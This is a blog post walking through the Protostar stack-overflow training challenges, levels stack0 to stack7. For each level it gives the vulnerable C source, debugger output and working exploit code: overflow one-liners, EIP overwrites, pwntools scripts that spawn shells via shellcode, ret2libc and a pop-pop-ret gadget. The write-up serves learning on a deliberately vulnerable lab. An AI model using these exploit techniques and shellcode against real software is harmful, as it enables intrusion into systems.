---
layout: post
title:  "Protostar Day One (Stack)"
date:   2020-07-01 01:05:48 +0100
categories: pwn
---
Starting this journey I will be following through the excercises found [here](https://exploit-exercises.lains.space/protostar/).

The first of these challenges are Stack0.

## Stack0.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
In this challenge there is a vulnerable gets() call that we can exploit to change the variable "modified" to something that is not 0. To do this we can simply run a python command to send in x number of characters to overwrite the buffer and the modified variable.

### Exploit Code
```
python -c "print 'A' * 76 + 'pwn'" | ./stack0
```

## Stack1.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
For this exercise, the goal is to change the "modified" variable to be 0x61626364. Since the buffer is the same, we already know to send 76 characters before we can overwrite the variable.

When writing our A's to the stack, it will be seen that we are writing 0x41414141 (41 = A in hex. Information on the conversions can be found [here](http://www.asciitable.com/)) and if we were to send 80 A's to the program, we will be shown that the variable has the value "0x41414141".

Now we could simply just do this by hand and look for each value 61, 62, 63, 64. Or we could just use the python library "struct".
As seen in the exploit code below, this gives the output dcba. Which, when passed into the program, gives us the correct output.

### Exploit Code
```
>>> import struct
>>> struct.pack("<L",0x61626364)
'dcba'

./stack1 $(python -c "print 'A' * 76 + 'dcba'")



```

## Stack2.c
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
For stack2 the objective is to change the modified variable to be: "0x0d0a0d0a". This challenge is slightly different however as it takes no user input when ran. It gets the input from the envronment variable "GREENIE". If we write a buffer overflow into this variable we can change the "modified" variable to be anything we like.

Again for this example we will just be using python's "struct" and a one-liner to complete.

### Exploit Code
```
>>> struct.pack("<L",0x0d0a0d0a)
'\n\r\n\r'

export GREENIE=$(python -c "print 'A' * 68 + '\n\r\n\r'"); ./stack2
```


## Stack3
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
In this challenge we can learn about redirecting code to reach new code that wasn't originally intended to run. In this case we have the function "win()" as the goal.
To do this challenge, I opened up the binary in gdb (ran the program once to get memory locations) and typed "disassemble win" to view the entry address of the function.

```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	sub    esp,0x18
   0x0804842a <+6>:	mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:	call   0x8048360 <puts@plt>
   0x08048436 <+18>:	leave  
   0x08048437 <+19>:	ret    
End of assembler dump.
```

With this memory address: 0x08048424 we can use the buffer overflow to overwrite the fp variable with the address we found and get the code to jump to that location and run whatever is there.

### Exploit Code
```
>>> struct.pack("<L",0x08048424)
'$\x84\x04\x08'

python -c "print 'A' * 64 + '$\x84\x04\x08'" | ./stack3
```

## Stack4
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
This challenge is similar to the other, but in this one we will be overwriting the "EIP" register instead of a variable to get the code to change as we please.

To do this I did the following steps.

First let's check for the location in memory the "win()" function is situated. Using gdb i discovered this to be 0x080483f4.
```
gdb-peda$ disassemble win
Dump of assembler code for function win:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	sub    esp,0x18
   0x080483fa <+6>:	mov    DWORD PTR [esp],0x80484e0
   0x08048401 <+13>:	call   0x804832c <puts@plt>
   0x08048406 <+18>:	leave  
   0x08048407 <+19>:	ret    
End of assembler dump.
```
Now we can use struct.pack from python to have the address ready to be used later.
```
>>> struct.pack("<L",0x080483f4)
'\xf4\x83\x04\x08'
```

in the peda extension of gdb we can use "pattern create" to create a string of characters that will allow us to idenitify which section of the string has overwritten the EIP register.
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```
Now after crashing the program with this string we can see the EIP register has been overwritten with "AA4A".

```
[----------------------------------registers-----------------------------------]
EAX: 0xffffd120 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xf7faa580 --> 0xfbad2288 
EDX: 0xffffd184 --> 0x0 
ESI: 0xf7faa000 --> 0x1dfd6c 
EDI: 0xf7faa000 --> 0x1dfd6c 
EBP: 0x65414149 ('IAAe')
ESP: 0xffffd170 ("AJAAfAA5AAKAAgAA6AAL")
EIP: 0x41344141 ('AA4A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
```
Gdb-peda also offers the "pattern offset" command to show that the offset to overwriting EIP is 76 characters.

```
gdb-peda$ pattern offset AA4A
AA4A found at offset: 76
```
With all of this information we can change the flow of the code using the exploit code below

### Exploit Code
```
python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4
```


## Stack5
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
In this challenge, we will be using the code above to perform a basic stack based buffer overflow exploit.

In order to do this I will be using shellcode from [shell-storm](http://shell-storm.org/shellcode/).

The plan for this is simple:

`Find the offset`

`Find an address on the stack to jump to` 

`Place a NOP slide on the stack to reach our shellcode` 

`And now we should have a shell`

First the offset, we know is 76, since it's the same as the last challenge.

Now let's set what address we could jump to on the stack.

To do this, we'll send a bunch of "A"'s to the program and monitor the stack after it crashes to look for a suitable place.
```
gdb-peda$ x/200x $esp-100
0xffffd10c:	0xd9	0x83	0x04	0x08	0x20	0xd1	0xff	0xff
0xffffd114:	0x00	0x00	0x08	0x00	0x00	0xa0	0xfa	0xf7
0xffffd11c:	0x88	0xdc	0xfa	0xf7	0x41	0x41	0x41	0x41
0xffffd124:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd12c:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd134:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```
Due to differences in running the program in gdb and running it without, (such as environment variables etc.) we will need a "NOP slide" (NOP = No operation).

This is used so that we can overwrite EIP with any stack address containing our NOP slide and still reach and execute the code we have on the stack.

This is an actual pain to do through the methods I stated above. (It works well in gdb but god is it a pain to set up without.) So I'll simply use the command "pwn template stack5" to generate a template from which I can write an exploit.


### Exploit Code
```
from pwn import *

exe = context.binary = ELF('stack5')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
# ROPgadget --binary stack5 | grep "call eax"
# 0x080483bf : call eax
call_eax = p32(0x080483bf)
offset = 76

payload = fit({0: asm(shellcraft.sh()), offset: call_eax})

io.sendline(payload)
io.interactive()
```

## Stack6

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
In this challenge the binary will have a simple security feature. This will stop of from changing EIP to be an address on the stack and as such can not have our code executed from the stack like we did in the previous challenge. To get around this, we will be performing a ret2libc attack. The idea here is simple: Overwrite EIP with the system() address of libc and pass that the parameter of the string "/bin/sh" that we can find in libc.

To do this we must fin0xf7dca000d out the addresses of the libc binary.

By starting the program in gdb and having a breakpoint in the program, we can run the "info proc map" command to view the objfiles and their position on the stack.

Info Proc Map:
```
gdb-peda$ info proc map
process 14727
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/corn/ctf/protostar/stack6/stack6
	 0x8049000  0x804a000     0x1000        0x0 /home/corn/ctf/protostar/stack6/stack6
	0xf7dca000 0xf7fa8000   0x1de000        0x0 /usr/lib32/libc-2.30.so
	0xf7fa8000 0xf7faa000     0x2000   0x1dd000 /usr/lib32/libc-2.30.so
	0xf7faa000 0xf7fac000     0x2000   0x1df000 /usr/lib32/libc-2.30.so
```
As seen above, it's using /usr/lib32/libc-2.30.so as the libc binary and the start address that we need to take note is 0xf7dca000.

Finding /bin/sh:
```
strings -t d /usr/lib32/libc.so.6 | grep /bin/sh
1606662 /bin/sh
```
Using strings on the libc binary we found from "info proc map" we can locate the offset of the /bin/sh string. With this we can add it to the base libc address we have to get the address of /bin/sh when the binary is running.

Find offset as explained before:

This part has been explained above so I won't bother going through it.


Find the memory locations of system and exit
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e0e5f0 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e01360 <exit>

```
By typing the 2 commands above we can get the memory addresses of both system and exit to put into our payload below.


### Exploit Code
```
from pwn import *

exe = context.binary = ELF('stack6')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

#strings -t d /usr/lib32/libc.so.6 | grep /bin/sh
#1606662 /bin/sh
#info proc map = 0xf7dca000

#gdb-peda$ pattern offset AJAA
#AJAA found at offset: 80

offset = 'A' * 80
bin_sh = p32(0xf7dca000 + 1606662)
system = p32(0xf7e0e5f0)
exit = p32(0xf7e01360) 

payload = offset + system + exit + bin_sh
io.sendline(payload)
io.interactive()
```
## Stack7
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();

}
```
Here is the final stack challenge on Protostar. The objective is to get a shell through abusing the "pop pop ret" gadget to have our shellcode executed.

I have used this same idea with different gadgets before, so I will just leave the exploit code for this one

### Exploit Code
```
from pwn import *

exe = context.binary = ELF('stack7')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

offset = 'A' * 80
pop_pop_ret = p32(0x08048492)
junk = "A" * 8
shell_addr = p32(0xffffd15a+20)
shell_code = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
nop_slide = "\x90" * 80


payload = offset + pop_pop_ret + junk + shell_addr + nop_slide + shell_code
io.sendline(payload)
io.interactive()
```

## Conclusion

Now we have finished all of the stack challenges on Protostar and can move on to the next challenge: Format string vulnerabilities.